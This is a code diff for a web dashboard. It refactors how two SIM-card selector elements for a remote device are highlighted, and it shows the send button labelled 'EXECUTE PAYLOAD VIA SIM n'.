@@ -2585,11 +2585,11 @@ function renderTab(silent = false) {
                 <div class="form-sub">Device: <span style="color:var(--cyan);font-family:var(--font-mono);font-weight:700;">${esc(d._id)}</span></div>
                 
                 <div class="sim-grid">
-                    <div class="sim-card ${selSim===1?'active':''}" onclick="switchSim(1)">
+                    <div id="remoteSimCard1" class="sim-card ${selSim===1?'active':''}" onclick="switchSim(1)">
                         <div class="sim-title">SIM 1</div>
                         <div class="sim-num">${esc(d.sims?.[0]?.phoneNumber||'Unknown')}</div>
                     </div>
-                    <div class="sim-card ${selSim===2?'active':''}" onclick="switchSim(2)">
+                    <div id="remoteSimCard2" class="sim-card ${selSim===2?'active':''}" onclick="switchSim(2)">
                         <div class="sim-title">SIM 2</div>
                         <div class="sim-num">${esc(d.sims?.[1]?.phoneNumber||'Unknown')}</div>
                     </div>
@@ -2663,11 +2663,10 @@ function renderMList() {
 
 function switchSim(n) {
     selSim = n;
-    const cards = document.querySelectorAll('.form-panel .sim-grid .sim-card');
-    cards.forEach((el, idx) => {
-        if (idx === n - 1) el.classList.add('active');
-        else el.classList.remove('active');
-    });
+    const s1 = document.getElementById('remoteSimCard1');
+    const s2 = document.getElementById('remoteSimCard2');
+    if (s1) s1.classList.toggle('active', n === 1);
+    if (s2) s2.classList.toggle('active', n === 2);
     const btn = document.querySelector('.btn-send');
     if (btn) btn.textContent = `EXECUTE PAYLOAD VIA SIM ${n}`;
 }
